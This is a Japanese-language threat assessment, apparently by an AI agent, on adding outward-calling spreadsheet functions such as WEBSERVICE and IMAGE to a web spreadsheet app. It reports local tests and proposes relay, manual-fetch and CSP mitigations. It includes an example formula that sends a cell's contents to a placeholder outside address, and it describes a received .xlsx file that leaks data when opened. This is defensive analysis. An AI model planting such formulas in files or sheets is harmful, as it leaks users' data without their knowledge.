# 外へ 出る 関数 6個 — 数えた 物（2026-09-07）

> ★作っていません。数えただけです★（指示役の 注文どおり）
> 対象 … `WEBSERVICE` / `STOCKHISTORY` / `TRANSLATE` / `DETECTLANGUAGE` / `IMAGE` / `RTD`

---

## ★★一番 大事な 1行★★

```
 ★★この 6個は「関数が 6つ 増える」話では ありません★★
 ★★1つでも 作れば ★セルの 中身を 好きな 住所へ 送れる 出口★ が 開きます★★
```

---

## ★① 実測 … 送れるのか（本物の Chrome で 撃った）★

やり方 … `soto-e-deru-michi.mjs`（★外へは 1回も 出ていない／127.0.0.1 の 2つの 番号だけ★）

| 撃ち方 | 相手に 届いたか | 返事を 読めたか |
|---|---|---|
| ふつうの `fetch`（相手が 許していない） | ★届いた★ | 読めない |
| `fetch`（相手が 許している） | ★届いた★ | ★読めた★ |
| `no-cors` で 送りつける | ★届いた★ | 元から 読まない |
| 絵として 撃つ（`IMAGE` と 同じ） | ★届いた★ | — |

```
 ★秘密の 字が 相手に 届いた 回数 … 4回／4回★
 ★撃たなかった 弾が 記録に 出た … 0本★（＝物差しは 効いている）
```

### ★★答え … セルの 中身を 外へ 送れるか → ★はい★★★

```
 ★★「送る」と「読む」は 別です★★
 ブラウザの 決まり（CORS）が 止めるのは ★返事を 読む 方だけ★。
 ★送る 方は 相手が 許していなくても 通ります★。
 ⇒ `=WEBSERVICE("http://よそ?d="&A1)` は
    ★答えが #VALUE! に なっても、A1 の 中身は 相手に 届いています★
 ⇒★「エラーに なったから 出ていない」は 嘘★
```

---

## ★② 実測 … もらった ファイルを 開いただけで 走るか★

やり方 … `moratta-file-kara-hashiru-ka.mjs`

```
 ★.xlsx に `=WEBSERVICE("http://…?d="&A1)` を 入れて 本物の 読み込みで 開いた★
 ⇒★式は ★式のまま★ 入った（1文字も 変わっていない）★
 ⇒★式では ない 字は 式に 化けていない★（物差しの 確かめ）
```

### ★★答え … 開いた 人は 1文字も 打たなくても 走ります★★

```
 ⇒★危ないのは「お客さんが 自分で 書く 時」では ない★
 ⇒★★人から もらった ファイルを 開いた 時★★
 ⇒ 例）取引先から 来た 見積書を 開く
    ⇒ 中に 仕込まれた 式が ★社員名簿の セルを 外へ 送る★
```

---

## ★③ 今 本番に 在る 物との 違い（大事）★

```
 ★`Webを取りに行く()` は もう 本番に 在ります★（book.html 3499行）
 ⇒「Web から」の 窓で ★人が 手で 住所を 打って★ ★1回 押す★
```

| | 今 在る「Web から」 | 外へ 出る 関数 |
|---|---|---|
| 住所を 決めるのは | ★人が 手で 打つ★ | ★セルの 中身で 組み立てられる★ |
| いつ 走るか | ★押した 時だけ★ | ★開いた 時・計算の たび★ |
| もらった ファイルから 走るか | ★走らない★ | ★走る★ |
| 何回 走るか | ★1押し＝1回★ | ★行の 数だけ（1000行なら 1000回）★ |

```
 ⇒★★「もう 出口は 在るから 同じ」では ありません★★
 ⇒ 今の 物は ★人が 見て 押す★／関数は ★人が 知らない 間に 走る★
```

---

## ★④ 6個 それぞれ★

| 関数 | 相手は 誰か | お金 | 待ち時間 | 中身を 外へ 送れるか |
|---|---|---|---|---|
| `WEBSERVICE` | ★お客さんが 書いた 住所（どこでも）★ | 0円 | 相手しだい | ★はい（実測）★ |
| `IMAGE` | ★お客さんが 書いた 住所（どこでも）★ | 0円 | 相手しだい | ★はい（実測）★ |
| `TRANSLATE` | ★外の 会社（翻訳の 提供元）★ | ★契約が 要る★ | ★未測定★ | 送り先は 1つに 出来る |
| `DETECTLANGUAGE` | ★外の 会社（同上）★ | ★契約が 要る★ | ★未測定★ | 送り先は 1つに 出来る |
| `STOCKHISTORY` | ★外の 会社（相場の 提供元）★ | ★契約が 要る★ | ★未測定★ | 送り先は 1つに 出来る |
| `RTD` | ★常に 繋がっている 相手★ | — | — | ★相手が 居ない★ |

### ★★「未測定」と 書いた 訳★★

```
 ★外の 会社へは 1回も 出していません★（お金と 契約が 要る／私は 勝手に 契約しません）
 ⇒★待ち時間も 値段も ★一度も 測っていない★★
 ⇒★数字を 出せません★（出したら それは 私の 当てずっぽうです）
```

### ★`RTD` について★

```
 ★Excel の RTD は「向こうから 押してくる 相手」に 繋ぐ 物★
 ⇒ うちには ★その 相手が 居ません★
 ⇒★作っても 繋ぐ 先が 無い＝空の 箱★
 ⇒★これは「作れない」では なく「作る 意味が 今 無い」★
```

---

## ★⑤ 止め方は 在るか★

★在ります。3つ 数えました★

```
 ★A. うちの サーバを 通す★（`api/` に 中継を 1つ 置く）
    ⇒ 行き先を ★うちが 決めた 相手だけ★に 絞れる
    ⇒★お客さんが 書いた 住所は そのまま 叩かない★
    ⇒ 代わりに ★お金と 待ち時間は うちが 持つ★（Vercel の 走った 時間）

 ★B. 式では 走らせない★（今の「Web から」と 同じ 形）
    ⇒★人が 見て 1回 押す★／もらった ファイルからは 走らない

 ★C. 出て よい 相手の 一覧を 画面に 縛りつける★（CSP の connect-src）
    ⇒★実測 … 今 CSP は ★1本も 在りません★★（vercel.json・book.html・hub.html を 見た）
    ⇒ 入れれば ★私が 書き間違えても ブラウザが 止める★
```

```
 ★★A と B は 混ぜられます★★
 例）`TRANSLATE` … ★行き先は うちの サーバ 1つ★（A）＋★式でも 走ってよい★
    ⇒ 送る 先が 1つなら ★「好きな 住所へ 送れる」は 起きない★
```

---

## ★⑥ ★0円で 危なくない 物★は 在るか★

### ★★答え … ★1つも ありません★★★

```
 ★0円の 2つ（WEBSERVICE・IMAGE）★
   ⇒★0円なのは ★どこへでも 出られるから★★＝危なさ そのもの
 ★安全に 出来る 3つ（TRANSLATE・DETECTLANGUAGE・STOCKHISTORY）★
   ⇒★行き先を 1つに 縛れる＝安全★／でも ★お金が かかる★
 ★RTD★ ⇒ 繋ぐ 相手が 居ない
```

```
 ⇒★★「安いか」と「安全か」が ちょうど 裏返し★★
 ⇒★だから「とりあえず 安い 方から」は ★一番 危ない 方から★に なります★
```

---

## ★⑦ 私の 見立て（決めるのは 司さん）★

```
 ★お客さんが 本当に 困っているのは どれか★を 先に 聞く 方が 早いと 思います。
 ⇒ 6個の うち ★Excel の 現場で よく 使われるのは STOCKHISTORY と TRANSLATE★
 ⇒ `WEBSERVICE` は ★Excel でも「使うな」と 言われている 方★
 ★でも これは 私の 見立てで、★数えていません★★
 ⇒★「どれが 要るか」を 数えるなら ★お客さんに 聞く★のが 筋です★
```

---

## ★測った 物★

| ファイル | 何を したか |
|---|---|
| `soto-e-deru-michi.mjs` / `.txt` | 本物の Chrome で 4通り 撃って 相手が 受け取ったかを 数えた |
| `moratta-file-kara-hashiru-ka.mjs` / `.txt` | もらった .xlsx の 式が 式のまま 入るかを 数えた |
| `moratta.xlsx` | その 測りで 作った ファイル（式が 1つ 入っている） |

```
 ★どちらも 外へは 1回も 出ていません★（127.0.0.1 だけ／お金 0円）
 ★もう一度 走らせれば 同じ 数が 出ます★
```
